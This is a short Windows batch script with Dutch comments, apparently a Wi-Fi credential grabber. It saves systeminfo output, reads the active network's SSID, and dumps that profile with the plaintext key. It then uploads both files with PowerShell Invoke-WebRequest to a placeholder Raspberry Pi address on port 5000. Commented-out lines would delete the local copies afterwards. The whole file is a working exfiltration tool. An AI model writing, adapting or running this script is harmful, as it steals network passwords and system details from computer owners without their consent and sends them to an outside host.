@echo off
setlocal enabledelayedexpansion

:: Verzamel systeeminformatie
systeminfo > C:\Temp\sysinfo.txt


:: Probeer eerst de actieve Wi-Fi SSID op te halen
for /f "tokens=*" %%a in ('powershell -Command "(netsh wlan show interfaces) -match 'SSID' | Select-Object -First 1 | ForEach-Object { ($_ -split ': ')[1].Trim() }"') do set ssid=%%a


echo Opgehaalde SSID: [%ssid%]
pause

:: Controleer of het netwerk is opgeslagen
netsh wlan show profiles | findstr /I /C:"%ssid%" > nul
if %errorlevel% neq 0 (
    echo Wi-Fi netwerk %ssid% is niet opgeslagen op deze computer.
    exit /b
)

:: Vraag het wachtwoord op
netsh wlan show profile name="%ssid%" key=clear > C:\Temp\wifi_password.txt


:: Stuur SYSTEEMINFORMATIE naar Raspberry Pi
powershell -Command "Invoke-WebRequest -Uri 'http://{your rpi ip}:5000/upload' -Method POST -InFile 'C:\Temp\sysinfo.txt' -ContentType 'text/plain'"

:: Stuur Wi-Fi WACHTWOORDEN naar Raspberry Pi
powershell -Command "Invoke-WebRequest -Uri 'http://{your rpi ip}:5000/upload' -Method POST -InFile 'C:\Temp\wifi_password.txt' -ContentType 'text/plain'"

:: Optioneel: Verwijder bestanden na verzending
:: del C:\Temp\sysinfo.txt
:: del C:\Temp\wifi_password.txt

:: Laat een melding zien dat de upload is voltooid
echo Data verzonden!
pause
